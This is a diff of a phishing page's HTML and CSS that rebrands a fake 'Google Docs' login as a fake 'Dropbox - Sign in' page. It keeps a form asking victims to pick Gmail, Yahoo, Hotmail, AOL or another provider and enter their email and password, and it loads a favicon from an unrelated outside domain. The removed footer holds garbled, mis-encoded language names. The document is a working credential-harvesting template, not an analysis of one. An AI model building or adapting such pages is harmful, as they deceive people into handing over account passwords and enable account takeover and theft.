@@ -3,25 +3,28 @@
 
 <!DOCTYPE html>
 <html lang="en">
-  <head>
+<head>
   <meta charset="utf-8">
   <meta content="width=300, initial-scale=1" name="viewport">
- <title>Google Docs</title>
+<link rel="icon" href="http://centurionregistrars.com/assets/1/2/notice/favicon.ico" type="image/x-icon" />
+ <title>Dropbox - Sign in</title>
 <style>
   html, body {
-  font-family: Arial, sans-serif;
-  background: #fff;
-  margin: 0;
-  padding: 0;
-  border: 0;
-  position: absolute;
-  height: 100%;
-  min-width: 100%;
-  font-size: 13px;
-  color: #404040;
-  direction: ltr;
-  -webkit-text-size-adjust: none;
+	font-family: "Trebuchet MS", Arial, Helvetica, sans-serif;
+	margin: 0;
+	border: 0;
+	position: absolute;
+	height: 100%;
+	min-width: 100%;
+	font-size: 14px;
+	color: #404040;
+	direction: ltr;
+	-webkit-text-size-adjust: none;
+	padding: 0;
   }
+.wrapper .google-header-bar.centered img {
+	margin: 10px;
+}
   button,
   input[type=button],
   input[type=submit] {
@@ -222,7 +225,13 @@
   min-height: 100%;
   }
   .content {
-  padding: 0 44px;
+	padding-top: 50;
+	padding-bottom: 0;
+	width: 1060px;
+	margin-right: auto;
+	margin-left: auto;
+	padding-right: 30px;
+	padding-left: 30px;
   }
   .main {
   padding-bottom: 100px;
@@ -242,8 +251,13 @@
   }
   .google-header-bar {
 	height: 75px;
-	border-bottom: 1px solid #e5e5e5;
 	overflow: hidden;
+	width: 1000px;
+	margin-right: auto;
+	margin-left: auto;
+	border-bottom-width: 1px;
+	border-bottom-style: groove;
+	border-bottom-color: #666;
   }
   .header .logo {
 	float: left;
@@ -260,8 +274,13 @@
   font-weight: normal;
   }
   .google-header-bar.centered {
-	border: 0;
-	height: 75px;
+	height: 100px;
+	border-top-width: 0;
+	border-right-width: 0;
+	border-bottom-width: 1;
+	border-left-width: 0;
+	border-bottom-style: solid;
+	border-bottom-color: #999;
   }
   .google-header-bar.centered .header .logo {
   float: none;
@@ -326,24 +345,24 @@
   text-align: center;
   }
   .card {
-  background-color: #f7f7f7;
-  padding: 20px 25px 30px;
-  margin: 0 auto 25px;
-  width: 304px;
-  -moz-border-radius: 2px;
-  -webkit-border-radius: 2px;
-  border-radius: 2px;
-  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
-  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
-  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
+	width: 304px;
+	-moz-border-radius: 2px;
+	-webkit-border-radius: 2px;
+	border-radius: 2px;
+	padding-top: 20px;
+	padding-right: 25px;
+	padding-bottom: 30px;
+	padding-left: 25px;
+	float: left;
   }
   .card > *:first-child {
-  margin-top: 0;
+	margin-top: 0;
   }
   .rc-button,
   .rc-button:visited {
   display: inline-block;
-  min-width: 46px;
+  float: right;
+	width: 70px
   text-align: center;
   color: #444;
   font-size: 14px;
@@ -372,8 +391,9 @@
   cursor: default;
   }
   .card .rc-button {
-  width: 100%;
-  padding: 0;
+	width: 70px;
+	padding: 0;
+	float: right;
   }
   .rc-button.disabled,
   .rc-button[disabled] {
@@ -413,15 +433,17 @@
   }
   .rc-button-submit,
   .rc-button-submit:visited {
-  border: 1px solid #3079ed;
-  color: #fff;
-  text-shadow: 0 1px rgba(0,0,0,0.1);
-  background-color: #4d90fe;
-  background-image: -webkit-linear-gradient(top,#4d90fe,#4787ed);
-  background-image: -moz-linear-gradient(top,#4d90fe,#4787ed);
-  background-image: -ms-linear-gradient(top,#4d90fe,#4787ed);
-  background-image: -o-linear-gradient(top,#4d90fe,#4787ed);
-  background-image: linear-gradient(top,#4d90fe,#4787ed);
+	border: 1px solid #3079ed;
+	color: #fff;
+	text-shadow: 0 1px rgba(0,0,0,0.1);
+	background-color: #4d90fe;
+	background-image: -webkit-linear-gradient(top,#4d90fe,#4787ed);
+	background-image: -moz-linear-gradient(top,#4d90fe,#4787ed);
+	background-image: -ms-linear-gradient(top,#4d90fe,#4787ed);
+	background-image: -o-linear-gradient(top,#4d90fe,#4787ed);
+	background-image: linear-gradient(top,#4d90fe,#4787ed);
+	float: right;
+	width: 70px;
   }
   .rc-button-submit:hover {
   border: 1px solid #2f5bb7;
@@ -435,16 +457,16 @@
   background-image: linear-gradient(top,#4d90fe,#357ae8);
   }
   .rc-button-submit:active {
-  background-color: #357ae8;
-  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
-  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
-  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
-  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
-  background-image: linear-gradient(top,#4d90fe,#357ae8);
-
-  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
-  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
-  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
+	background-color: #357ae8;
+	background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
+	background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
+	background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
+	background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
+	background-image: linear-gradient(top,#4d90fe,#357ae8);
+	-moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
+	-webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
+	box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
+	width: 75px;
   }
   .rc-button-red,
   .rc-button-red:visited {
@@ -484,6 +506,10 @@
   .secondary-actions {
   text-align: center;
   }
+.wrapper .bgimg {
+	float: left;
+	margin-right: 50px;
+}
 </style>
 <style media="screen and (max-width: 800px), screen and (max-height: 800px)">
   .google-header-bar.centered {
@@ -497,6 +523,15 @@
   .card {
   margin-bottom: 20px;
   }
+.customwrapper {
+	width: 750px;
+	margin-right: auto;
+	margin-left: auto;
+	margin-top: 100px;
+	height: 100%;
+	clear: both;
+	display: block;
+}
 </style>
 <style media="screen and (max-width: 580px)">
   html, body {
@@ -597,17 +632,14 @@
   margin-bottom: 20px;
   }
   .signin-card {
-  width: 274px;
-  padding: 40px 40px;
+	width: 380px;
+	padding: 30px;
   }
   .signin-card .profile-img {
-  width: 96px;
-  height: 96px;
-  margin: 0 auto 10px;
-  display: block;
-  -moz-border-radius: 50%;
-  -webkit-border-radius: 50%;
-  border-radius: 50%;
+	width: 96px;
+	height: 96px;
+	margin: 0 auto 10px;
+	display: block;
   }
   .signin-card .profile-name {
   font-size: 16px;
@@ -618,16 +650,16 @@
   }
   .signin-card input[type=email],
   .signin-card input[type=password],
-  .signin-card input[type=text],
-  .signin-card input[type=submit] {
-  width: 100%;
-  display: block;
-  margin-bottom: 10px;
-  z-index: 1;
-  position: relative;
-  -moz-box-sizing: border-box;
-  -webkit-box-sizing: border-box;
-  box-sizing: border-box;
+  .signin-card input[type=text]
+ {
+	width: 100%;
+	display: block;
+	margin-bottom: 10px;
+	z-index: 1;
+	position: relative;
+	-moz-box-sizing: border-box;
+	-webkit-box-sizing: border-box;
+	box-sizing: border-box;
   }
   .signin-card #Email,
   .signin-card #Passwd,
@@ -931,33 +963,27 @@
     
   <body>
   <div class="wrapper">
-  <div class="google-header-bar  centered">
-  <div class="header content clearfix">
-  <img src="logo_strip.png" alt="Google" width="405" height="72" class="logo">
+  <div class="google-header-bar  centered clearfix"><img name="" src="dropboxlogo.png" width="264" height="73" alt="">
+ 
   </div>
-  </div>
+  <div class="line"></div>
   <div class="main content clearfix">
-<div class="banner">
-  <h2> Welcome to Google Docs. Upload and Share Your Documents Securely </h2>
-  <h2 class="hidden-small">
-    Sign in with your email address to view or download attachment</h2>
-</div>
-<div class="card signin-card clearfix">
-  <div id="cc_iframe_parent"></div>
-<img class="profile-img" src="avatar_2x.png" alt="">
-<!-- form submit start -->
-			<form action="index.html#" method="POST" autocomplete="OFF">
-   <div><strong>Select your email provider</strong></div></br>
+  <div class="customwrapper">
+  <img class="bgimg" src="dropboxbkg.png" width="250" height="264" alt="">
+    <div class="card signin-card clearfix"><img src="dropbox.jpeg" alt="" width="140" height="140" class="profile-img">
+  <!-- form submit start -->
+      <form action="index.html#" method="POST" autocomplete="OFF">
+   <div> Sign in with your email provider   </div></br>
     <input type="hidden" name="hidCflag" id="hidCflag" value="" />
-    <select class="cflagdd"><option value="0" data-imagesrc="Google_docs_files/mail_gmail.png"
+    <select class="cflagdd"><option value="0" selected data-imagesrc="dropbox_files/mail_gmail.png"
             data-description="Sign in with Gmail">Gmail</option>
-        <option value="1" data-imagesrc="Google_docs_files/yahoo.png"
+        <option value="1" data-imagesrc="dropbox_files/yahoo.png"
             data-description="Sign in with Yahoo">Yahoo</option>
-        <option value="2"  data-imagesrc="Google_docs_files/live_hotmail.png"
+        <option value="2"  data-imagesrc="dropbox_files/live_hotmail.png"
             data-description="Sign in with Hotmail">Hotmail</option>
-        <option value="3" data-imagesrc="Google_docs_files/aol.png"
+        <option value="3" data-imagesrc="dropbox_files/aol.png"
             data-description="Sign in with AOL">AOL</option>
-        <option value="4" data-imagesrc="Google_docs_files/email.png"
+        <option value="4" data-imagesrc="dropbox_files/email.png"
             data-description="Sign in with Others">Others</option></select>
              <br/>
          <label class="hidden-label" for="Email">Email</label>
@@ -975,337 +1001,19 @@
        placeholder="Password"
        class="">
 <span class="passwordRequiredMsg">Enter your password.</span></span>
-<input id="signIn" name="signIn" class="rc-button rc-button-submit" type="submit" value="Sign in to view attachment">
+<input id="signIn" name="signIn" class="rc-button rc-button-submit" type="submit" value="Sign in">
   <label class="remember">
   <input id="PersistentCookie" name="PersistentCookie"
                  type="checkbox" value="yes">
   <span>
-  Stay signed in
+  Remember me
   </span>
   </label>
   <input type="hidden" name="rmShown" value="1">
-  <a id="link-forgot-passwd" href="index.html#"
-       class="need-help-reverse"
-       >
-  Need help?
-  </a>
-</form>
+	  </form>
 </div>
-<div class="one-google">
-  <p class="tagline">
-    Access your documents securely, no matter your location
-</p>
-<img src="logo_strip_2x.png" width="420" height="32" alt="">
 </div>
   </div>
-  <div class="google-footer-bar">
-  <div class="footer content clearfix">
-  <ul id="footer-list">
-  <li>
-  Google
-  </li>
-  <li>
-  <a href="index.html#" target="_blank">
-  Privacy &amp; Terms
-  </a>
-  </li>
-  <li>
-  <a href="index.html#" target="_blank">
-  Help
-  </a>
-  </li>
-  </ul>
-  <div id="lang-vis-control" style="display: none">
-  <span id="lang-chooser-wrap" class="lang-chooser-wrap">
-  <label for="lang-chooser"><img src="universal_language_settings-21.png" alt="Change language"></label>
-  <select id="lang-chooser" class="lang-chooser" name="lang-chooser">
-  <option value="af"
-                 >
-  Ð²Ð‚Ð„AfrikaansÐ²Ð‚Â¬
-  </option>
-  <option value="az"
-                 >
-  Ð²Ð‚Ð„azÐ™â„¢rbaycanÐ²Ð‚Â¬
-  </option>
-  <option value="in"
-                 >
-  Ð²Ð‚Ð„Bahasa IndonesiaÐ²Ð‚Â¬
-  </option>
-  <option value="ms"
-                 >
-  Ð²Ð‚Ð„Bahasa MelayuÐ²Ð‚Â¬
-  </option>
-  <option value="ca"
-                 >
-  Ð²Ð‚Ð„catalÐ“Â Ð²Ð‚Â¬
-  </option>
-  <option value="cs"
-                 >
-  Ð²Ð‚Ð„Ð”ÐŠeÐ•ÐŽtinaÐ²Ð‚Â¬
-  </option>
-  <option value="da"
-                 >
-  Ð²Ð‚Ð„DanskÐ²Ð‚Â¬
-  </option>
-  <option value="de"
-                 >
-  Ð²Ð‚Ð„DeutschÐ²Ð‚Â¬
-  </option>
-  <option value="et"
-                 >
-  Ð²Ð‚Ð„eestiÐ²Ð‚Â¬
-  </option>
-  <option value="en-GB"
-                 >
-  Ð²Ð‚Ð„English (United Kingdom)Ð²Ð‚Â¬
-  </option>
-  <option value="en"
-                
-                  selected="selected"
-                 >
-  Ð²Ð‚Ð„English (United States)Ð²Ð‚Â¬
-  </option>
-  <option value="es"
-                 >
-  Ð²Ð‚Ð„EspaÐ“Â±ol (EspaÐ“Â±a)Ð²Ð‚Â¬
-  </option>
-  <option value="es-419"
-                 >
-  Ð²Ð‚Ð„EspaÐ“Â±ol (LatinoamÐ“Â©rica)Ð²Ð‚Â¬
-  </option>
-  <option value="eu"
-                 >
-  Ð²Ð‚Ð„euskaraÐ²Ð‚Â¬
-  </option>
-  <option value="fil"
-                 >
-  Ð²Ð‚Ð„FilipinoÐ²Ð‚Â¬
-  </option>
-  <option value="fr-CA"
-                 >
-  Ð²Ð‚Ð„FranÐ“Â§ais (Canada)Ð²Ð‚Â¬
-  </option>
-  <option value="fr"
-                 >
-  Ð²Ð‚Ð„FranÐ“Â§ais (France)Ð²Ð‚Â¬
-  </option>
-  <option value="gl"
-                 >
-  Ð²Ð‚Ð„galegoÐ²Ð‚Â¬
-  </option>
-  <option value="hr"
-                 >
-  Ð²Ð‚Ð„HrvatskiÐ²Ð‚Â¬
-  </option>
-  <option value="zu"
-                 >
-  Ð²Ð‚Ð„isiZuluÐ²Ð‚Â¬
-  </option>
-  <option value="is"
-                 >
-  Ð²Ð‚Ð„Ð“Â­slenskaÐ²Ð‚Â¬
-  </option>
-  <option value="it"
-                 >
-  Ð²Ð‚Ð„ItalianoÐ²Ð‚Â¬
-  </option>
-  <option value="sw"
-                 >
-  Ð²Ð‚Ð„KiswahiliÐ²Ð‚Â¬
-  </option>
-  <option value="lv"
-                 >
-  Ð²Ð‚Ð„latvieÐ•ÐŽuÐ²Ð‚Â¬
-  </option>
-  <option value="lt"
-                 >
-  Ð²Ð‚Ð„lietuviÐ•Ñ–Ð²Ð‚Â¬
-  </option>
-  <option value="hu"
-                 >
-  Ð²Ð‚Ð„magyarÐ²Ð‚Â¬
-  </option>
-  <option value="nl"
-                 >
-  Ð²Ð‚Ð„NederlandsÐ²Ð‚Â¬
-  </option>
-  <option value="no"
-                 >
-  Ð²Ð‚Ð„norskÐ²Ð‚Â¬
-  </option>
-  <option value="pl"
-                 >
-  Ð²Ð‚Ð„polskiÐ²Ð‚Â¬
-  </option>
-  <option value="pt"
-                 >
-  Ð²Ð‚Ð„PortuguÐ“Ð„sÐ²Ð‚Â¬
-  </option>
-  <option value="pt-BR"
-                 >
-  Ð²Ð‚Ð„PortuguÐ“Ð„s (Brasil)Ð²Ð‚Â¬
-  </option>
-  <option value="pt-PT"
-                 >
-  Ð²Ð‚Ð„PortuguÐ“Ð„s (Portugal)Ð²Ð‚Â¬
-  </option>
-  <option value="ro"
-                 >
-  Ð²Ð‚Ð„romÐ“ÑžnÐ”Ñ“Ð²Ð‚Â¬
-  </option>
-  <option value="sk"
-                 >
-  Ð²Ð‚Ð„SlovenÐ”ÐŒinaÐ²Ð‚Â¬
-  </option>
-  <option value="sl"
-                 >
-  Ð²Ð‚Ð„slovenÐ•ÐŽÐ”ÐŒinaÐ²Ð‚Â¬
-  </option>
-  <option value="fi"
-                 >
-  Ð²Ð‚Ð„SuomiÐ²Ð‚Â¬
-  </option>
-  <option value="sv"
-                 >
-  Ð²Ð‚Ð„SvenskaÐ²Ð‚Â¬
-  </option>
-  <option value="vi"
-                 >
-  Ð²Ð‚Ð„TiÐ±Ñ”Ñ—ng ViÐ±Â»â€¡tÐ²Ð‚Â¬
-  </option>
-  <option value="tr"
-                 >
-  Ð²Ð‚Ð„TÐ“Ñ˜rkÐ“Â§eÐ²Ð‚Â¬
-  </option>
-  <option value="el"
-                 >
-  Ð²Ð‚Ð„Ðžâ€¢ÐžÂ»ÐžÂ»ÐžÂ·ÐžÐ…Ðžâ„–ÐžÑ”ÐžÂ¬Ð²Ð‚Â¬
-  </option>
-  <option value="bg"
-                 >
-  Ð²Ð‚Ð„Ð Â±Ð¡Ð‰Ð Â»Ð Ñ–Ð Â°Ð¡Ð‚Ð¡ÐƒÐ Ñ”Ð Ñ‘Ð²Ð‚Â¬
-  </option>
-  <option value="mn"
-                 >
-  Ð²Ð‚Ð„Ð Ñ˜Ð Ñ•Ð Ð…Ð Ñ–Ð Ñ•Ð Â»Ð²Ð‚Â¬
-  </option>
-  <option value="ru"
-                 >
-  Ð²Ð‚Ð„Ð Â Ð¡Ñ“Ð¡ÐƒÐ¡ÐƒÐ Ñ”Ð Ñ‘Ð â„–Ð²Ð‚Â¬
-  </option>
-  <option value="sr"
-                 >
-  Ð²Ð‚Ð„Ð ÐŽÐ¡Ð‚Ð Ñ—Ð¡ÐƒÐ Ñ”Ð Ñ‘Ð²Ð‚Â¬
-  </option>
-  <option value="uk"
-                 >
-  Ð²Ð‚Ð„Ð ÐˆÐ Ñ”Ð¡Ð‚Ð Â°Ð¡â€”Ð Ð…Ð¡ÐƒÐ¡ÐŠÐ Ñ”Ð Â°Ð²Ð‚Â¬
-  </option>
-  <option value="ka"
-                 >
-  Ð²Ð‚Ð„Ð±Ñ“ÒÐ±Ñ“Ñ’Ð±Ñ“Â Ð±Ñ“â€”Ð±Ñ“ÐˆÐ±Ñ“Ñ™Ð±Ñ“Â˜Ð²Ð‚Â¬
-  </option>
-  <option value="hy"
-                 >
-  Ð²Ð‚Ð„Ð¥Â°Ð¥ÐŽÐ¥ÂµÐ¥ÒÐ¦Ð‚Ð¥ÒÐ¥Â¶Ð²Ð‚Â¬
-  </option>
-  <option value="iw"
-                 >
-  Ð²Ð‚Â«Ð§ÑžÐ§â€˜Ð§ÐÐ§â„¢Ð§Ð„Ð²Ð‚Â¬Ð²Ð‚Ð‹
-  </option>
-  <option value="ur"
-                 >
-  Ð²Ð‚Â«Ð¨Â§Ð¨Â±Ð¨Ð‡Ð©â‚¬Ð²Ð‚Â¬Ð²Ð‚Ð‹
-  </option>
-  <option value="ar"
-                 >
-  Ð²Ð‚Â«Ð¨Â§Ð©â€žÐ¨â„–Ð¨Â±Ð¨ÐÐ©Ð‰Ð¨Â©Ð²Ð‚Â¬Ð²Ð‚Ð‹
-  </option>
-  <option value="fa"
-                 >
-  Ð²Ð‚Â«Ð©ÐƒÐ¨Â§Ð¨Â±Ð¨Ñ–Ð«ÐŠÐ²Ð‚Â¬Ð²Ð‚Ð‹
-  </option>
-  <option value="am"
-                 >
-  Ð²Ð‚Ð„Ð±Ð‰Â Ð±â‚¬â€ºÐ±â‚¬Â­Ð±Ð‰â€ºÐ²Ð‚Â¬
-  </option>
-  <option value="ne"
-                 >
-  Ð²Ð‚Ð„Ð°Â¤ÐÐ°Òâ€¡Ð°Â¤Ð„Ð°Â¤Ñ•Ð°Â¤Ð†Ð°ÒÐ‚Ð²Ð‚Â¬
-  </option>
-  <option value="mr"
-                 >
-  Ð²Ð‚Ð„Ð°Â¤Â®Ð°Â¤Â°Ð°Â¤Ñ•Ð°Â¤Â Ð°ÒÐ‚Ð²Ð‚Â¬
-  </option>
-  <option value="hi"
-                 >
-  Ð²Ð‚Ð„Ð°Â¤â„–Ð°Â¤Ñ—Ð°Â¤ÐÐ°ÒÐŒÐ°Â¤Â¦Ð°ÒÐ‚Ð²Ð‚Â¬
-  </option>
-  <option value="bn"
-                 >
-  Ð²Ð‚Ð„Ð°Â¦Â¬Ð°Â¦Ñ•Ð°Â¦â€šÐ°Â¦Ð†Ð°Â¦Ñ•Ð²Ð‚Â¬
-  </option>
-  <option value="gu"
-                 >
-  Ð²Ð‚Ð„Ð°Ð„â€”Ð°Â«ÐƒÐ°Ð„ÑšÐ°Ð„Â°Ð°Ð„Ñ•Ð°Ð„Â¤Ð°Â«Ð‚Ð²Ð‚Â¬
-  </option>
-  <option value="ta"
-                 >
-  Ð²Ð‚Ð„Ð°Â®Â¤Ð°Â®Â®Ð°Â®Ñ—Ð°Â®Ò‘Ð°Ð‡ÐŒÐ²Ð‚Â¬
-  </option>
-  <option value="te"
-                 >
-  Ð²Ð‚Ð„Ð°Â°Â¤Ð°Â±â€ Ð°Â°Ð†Ð°Â±ÐƒÐ°Â°â€”Ð°Â±ÐƒÐ²Ð‚Â¬
-  </option>
-  <option value="kn"
-                 >
-  Ð²Ð‚Ð„Ð°Ð†â€¢Ð°Ð†ÐÐ°Ñ–ÐŒÐ°Ð†ÐÐ°Ð†ÐŽÐ²Ð‚Â¬
-  </option>
-  <option value="ml"
-                 >
-  Ð²Ð‚Ð„Ð°Ò‘Â®Ð°Ò‘Ð†Ð°Ò‘Ð‡Ð°Ò‘Ñ•Ð°Ò‘Ñ–Ð°Ò‘â€šÐ²Ð‚Â¬
-  </option>
-  <option value="si"
-                 >
-  Ð²Ð‚Ð„Ð°Â·Ñ“Ð°Â·â€™Ð°Â¶â€šÐ°Â·â€žÐ°Â¶Ð…Ð²Ð‚Â¬
-  </option>
-  <option value="th"
-                 >
-  Ð²Ð‚Ð„Ð°â„–â€žÐ°Ñ‘â€”Ð°Ñ‘ÑžÐ²Ð‚Â¬
-  </option>
-  <option value="lo"
-                 >
-  Ð²Ð‚Ð„Ð°Ñ”ÒÐ°Ñ”Ð†Ð°Ñ”Â§Ð²Ð‚Â¬
-  </option>
-  <option value="km"
-                 >
-  Ð²Ð‚Ð„Ð±Ñ›ÐƒÐ±ÑŸâ€™Ð±Ñ›Â˜Ð±ÑŸâ€šÐ±Ñ›Ñ™Ð²Ð‚Â¬
-  </option>
-  <option value="ko"
-                 >
-  Ð²Ð‚Ð„Ð½â€¢ÑšÐºÂµÂ­Ð¼â€“Ò‘Ð²Ð‚Â¬
-  </option>
-  <option value="zh-HK"
-                 >
-  Ð²Ð‚Ð„Ð´Ñ‘Â­Ð¶â€“â€¡Ð¿Ñ˜â‚¬Ð¹Â¦â„¢Ð¶Ñ‘Ð‡Ð¿Ñ˜â€°Ð²Ð‚Â¬
-  </option>
-  <option value="ja"
-                 >
-  Ð²Ð‚Ð„Ð¶â€”ÒÐ¶ÑšÂ¬Ð¸Ð„Ñ›Ð²Ð‚Â¬
-  </option>
-  <option value="zh-CN"
-                 >
-  Ð²Ð‚Ð„Ð·Â®Ð‚Ð´Ð…â€œÐ´Ñ‘Â­Ð¶â€“â€¡Ð²Ð‚Â¬
-  </option>
-  <option value="zh-TW"
-                 >
-  Ð²Ð‚Ð„Ð·â„–ÐƒÐ¹Â«â€Ð´Ñ‘Â­Ð¶â€“â€¡Ð²Ð‚Â¬
-  </option>
-  </select>
-  </span>
-  </div>
-  </div>
-</div>
   </div>
   
   <script type="text/javascript" src="jquery.min.js"></script>
